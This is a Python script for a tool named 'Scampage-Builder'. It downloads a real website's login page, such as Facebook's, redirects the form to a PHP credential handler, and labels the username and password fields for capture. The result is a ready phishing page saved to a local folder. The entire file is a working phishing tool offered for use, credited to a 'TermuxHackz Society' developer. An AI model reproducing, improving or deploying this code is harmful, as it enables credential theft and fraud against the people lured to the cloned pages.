import os
import requests
import time as t
from colorama import Fore
import logging
import json
from tqdm import tqdm

# Constants
BASE_DIR = "/storage/emulated/0/Scampage-Builder/"
VERSION = "1.0"
GITHUB_ISSUES_URL = "https://github.com/spider863644/Scampage-Builder/issues"
GITHUB_URL = "https://github.com/spider863644/Scampage-Builder"

# Configure logging
logging.basicConfig(filename='scampage_builder.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def load_config():
    try:
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        return config
    except FileNotFoundError:
        logging.error("Configuration file not found.")
        return {}

def main_menu():
    print(Fore.YELLOW + """
[1] Create Scampage
[2] Check Version
[3] Report Issue
[0] Exit
""")
    try:
        option = int(input(Fore.GREEN + "ENTER A VALID OPTION: "))
    except ValueError:
        print(Fore.RED + "Only integer values are accepted🙄🧐🧐")
        t.sleep(3)
        main_menu()
        return

    if option == 1:
        create_scampage()
    elif option == 2:
        check_version()
    elif option == 3:
        report_issue()
    elif option == 0:
        exit_program()
    else:
        print(Fore.RED + "Invalid option")
        t.sleep(3)
        main_menu()

def create_scampage():
    url = input(Fore.CYAN + "Paste URL of the scampage you need: ")
    php = input(Fore.CYAN + "Enter the PHP file name without extension: ")
    site = input(Fore.CYAN + "Enter the name of the website you are cloning [Example: Facebook]: ")
    email = input(Fore.CYAN + "Enter your working email address: ")
    print(Fore.MAGENTA + "Creating the HTML file")

    # Fetch Website Code with Retry Mechanism
    for _ in range(3):
        try:
            response = requests.get(url, timeout=10)
            response.raise_for_status()
            break
        except requests.RequestException as e:
            print(Fore.RED + f"Error: {e}")
            logging.error(f"Error fetching URL: {e}")
            t.sleep(3)
    else:
        print(Fore.RED + "Failed to fetch the website after multiple attempts.")
        main_menu()
        return

    code = response.text

    # Modify HTML Code
    if 'action="' in code:
        scampage = code.replace('action="', f'action="{php}.php"')
        new_scampage = scampage.replace('<input type="text" ', '<input type="text" name="username" ')
        new_scampage1 = new_scampage.replace('<input type="password" ', '<input type="password" name="password" ')

        # Create Directory and Backup Existing Directory
        site_dir = os.path.join(BASE_DIR, site)
        if os.path.exists(site_dir):
            backup_dir = site_dir + "_backup"
            if os.path.exists(backup_dir):
                os.rmdir(backup_dir)
            os.rename(site_dir, backup_dir)
            print(Fore.YELLOW + f"Existing directory backed up to {backup_dir}")

        os.makedirs(site_dir, exist_ok=True)

        # Save Modified HTML
        with open(os.path.join(site_dir, "index.html"), "w") as html_file:
            html_file.write(new_scampage1)

        print(Fore.GREEN + "Done creating the HTML file✅")
        logging.info(f"Scampage created for site: {site}")
    else:
        print(Fore.RED + "Error: The provided URL does not contain a form action attribute")
        logging.error("The provided URL does not contain a form action attribute")
        t.sleep(3)
        main_menu()

def check_version():
    print(Fore.YELLOW + f"Version is {VERSION}")
    t.sleep(2)
    main_menu()

def report_issue():
    print(Fore.LIGHTMAGENTA_EX + "Redirecting to github.com")
    t.sleep(2)
    os.system(f"xdg-open {GITHUB_ISSUES_URL}")

def exit_program():
    print(Fore.LIGHTYELLOW_EX + "Thanks for using Scampage-Builder\n\nFollow me on GitHub and leave a star")
    os.system(f"xdg-open {GITHUB_URL}")
    exit()

if __name__ == "__main__":
    config = load_config()
    print(Fore.YELLOW + "Developer: Spider Anongreyhat\nTeam: TermuxHackz Society")
    main_menu()
